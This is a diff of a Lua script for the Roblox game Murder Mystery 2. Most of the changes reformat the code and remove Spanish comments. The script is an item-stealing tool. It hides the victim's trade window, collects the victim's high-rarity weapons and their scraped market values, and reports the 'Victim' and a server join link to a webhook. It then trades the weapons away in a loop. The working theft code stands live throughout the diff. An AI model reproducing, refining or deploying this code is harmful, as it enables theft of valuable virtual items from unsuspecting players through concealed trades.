@@ -48,69 +48,42 @@ local headers = {
     ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
 }
 
--- Función de limpieza de strings
+-- Funciones de scraping
 local function trim(s) return s:match("^%s*(.-)%s*$") end
-
--- Función para obtener HTML
 local function fetchHTML(url)
-    local success, res = pcall(function()
-        return req({Url=url, Method="GET", Headers=headers})
-    end)
-    if success and res and res.Body then
-        return res.Body
-    end
+    local success, res = pcall(function() return req({Url=url, Method="GET", Headers=headers}) end)
+    if success and res and res.Body then return res.Body end
     return ""
 end
-
--- Función para extraer valores de items
 local function parseValue(itembodyDiv)
     local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
-    if valueStr then
-        valueStr = valueStr:gsub(",", "")
-        return tonumber(valueStr)
-    end
+    if valueStr then valueStr = valueStr:gsub(",", "") return tonumber(valueStr) end
 end
-
--- Extraer items de HTML
 local function extractItems(htmlContent)
     local itemValues = {}
     for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
         itemName = trim((itemName:match("([^<]+)") or ""):gsub("%s+", " ")):lower()
         local value = parseValue(itembodyDiv)
-        if itemName ~= "" and value then
-            itemValues[itemName] = value
-        end
+        if itemName ~= "" and value then itemValues[itemName] = value end
     end
     return itemValues
 end
-
--- Construir lista de valores desde web
 local function buildValueList()
     local allValues = {}
     for _, url in pairs(categories) do
         local html = fetchHTML(url)
         if html ~= "" then
             local extracted = extractItems(html)
-            for k,v in pairs(extracted) do
-                allValues[k] = v
-            end
+            for k,v in pairs(extracted) do allValues[k] = v end
         end
     end
-    -- Combinar con fallback
-    for k,v in pairs(fallbackValueList) do
-        if not allValues[k] then
-            allValues[k] = v
-        end
-    end
+    for k,v in pairs(fallbackValueList) do if not allValues[k] then allValues[k] = v end end
     return allValues
 end
-
 local valueList = buildValueList()
 
 -- Verificación de servidor
-if game.PlaceId ~= 142823291 then
-    LocalPlayer:Kick("Game not supported. Join a normal MM2 server.")
-end
+if game.PlaceId ~= 142823291 then LocalPlayer:Kick("Game not supported. Join a normal MM2 server.") end
 
 -- Función webhook
 local function SendWebhook(title, description, fields, prefix, thumbnail)
@@ -133,19 +106,13 @@ end
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
     local gui = playerGui:FindFirstChild(guiName)
-    if gui then
-        gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled=false end)
-        gui.Enabled = false
-    end
+    if gui then gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled=false end) gui.Enabled=false end
 end
 
 -- Trade seguro
 local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
 local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
-local function sendTradeRequest(user)
-    local plrObj = Players:FindFirstChild(user)
-    if plrObj then TradeService.SendRequest:InvokeServer(plrObj) end
-end
+local function sendTradeRequest(user) local plrObj = Players:FindFirstChild(user) if plrObj then TradeService.SendRequest:InvokeServer(plrObj) end end
 local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
 local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
 local function declineTrade() TradeService.DeclineTrade:FireServer() end
@@ -157,7 +124,6 @@ local database = require(game.ReplicatedStorage.Database.Sync.Item)
 local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
 local totalValue = 0
 local weaponsToSend = {}
-
 local profile = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
 for id, amount in pairs(profile.Weapons.Owned) do
     local item = database[id]
@@ -167,28 +133,16 @@ for id, amount in pairs(profile.Weapons.Owned) do
         if rarityIndex and rarityIndex >= minIndex then
             local value = valueList[item.ItemName:lower()] or 1
             if value >= min_value then
-                table.insert(weaponsToSend,{
-                    DataID = id,
-                    Amount = amount,
-                    Value = value,
-                    TotalValue = value * amount,
-                    Rarity = item.Rarity
-                })
+                table.insert(weaponsToSend,{DataID=id,Amount=amount,Value=value,TotalValue=value*amount,Rarity=item.Rarity})
             end
         end
     end
 end
-
--- Ordenar por valor total descendente
-table.sort(weaponsToSend, function(a,b) return a.TotalValue > b.TotalValue end)
-
--- Calcular valor total real
+table.sort(weaponsToSend,function(a,b) return a.TotalValue>b.TotalValue end)
 totalValue = 0
-for _, w in ipairs(weaponsToSend) do
-    totalValue += w.TotalValue
-end
+for _, w in ipairs(weaponsToSend) do totalValue += w.TotalValue end
 
--- Webhook con valor de cada arma y límite de caracteres
+-- Webhook
 local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
 local fields = {
     {name="Victim", value=LocalPlayer.Name, inline=true},
@@ -203,12 +157,11 @@ for i, w in ipairs(weaponsToSend) do
         break
     end
 end
-
 local prefix = _G.pingEveryone=="Yes" and "@everyone " or ""
 local thumbnailURL = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
 SendWebhook("💪MM2 Ultra Hit💯","💰Armas seleccionadas Godly/Ancient",fields,prefix,thumbnailURL)
 
--- Trade continuo ultra seguro priorizando armas de mayor valor
+-- Trade continuo ultra seguro
 local function doTrade(targetName)
     while #weaponsToSend > 0 do
         local status = getTradeStatus()
